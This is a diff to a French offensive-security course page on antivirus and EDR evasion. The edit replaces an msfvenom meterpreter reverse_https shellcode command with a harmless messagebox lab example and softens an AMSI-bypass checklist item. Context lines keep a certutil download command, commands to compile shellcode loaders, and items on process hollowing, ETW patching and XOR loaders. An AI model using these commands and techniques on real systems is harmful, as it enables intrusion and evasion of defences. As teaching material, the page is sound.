@@ -624,7 +624,7 @@ cargo build --release --target x86_64-pc-windows-gnu
 
 | Commande | Action |
 | -------- | ------ |
-| `msfvenom -p windows/x64/meterpreter/reverse_https -f raw -o sc.bin` | Générer un shellcode brut |
+| `msfvenom -p windows/x64/messagebox TEXT="lab" -f raw` | Exemple lab uniquement (pas de reverse shell hors périmètre autorisé) |
 | `x86_64-w64-mingw32-gcc loader.c -o loader.exe` | Cross-compiler un loader C pour Windows |
 | `cargo build --release --target x86_64-pc-windows-gnu` | Compiler un loader Rust pour Windows |
 | `certutil -urlcache -split -f URL fichier` | Télécharger un fichier via LOLBAS |
@@ -691,7 +691,7 @@ VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);
 
 - [ ] Je comprends la différence entre détection statique (signatures) et dynamique (comportementale)
 - [ ] Je sais expliquer le process hollowing et ses 5 étapes
-- [ ] Je peux écrire un bypass AMSI et expliquer comment il fonctionne
+- [ ] Je peux expliquer un bypass AMSI et comment un défenseur le détecte (sans l'utiliser hors lab)
 - [ ] Je comprends le rôle d'ETW et pourquoi le patcher aide l'évasion
 - [ ] Je connais au moins 5 binaires LOLBAS et leur utilisation offensive
 - [ ] Je sais développer un loader de shellcode en C avec chiffrement XOR
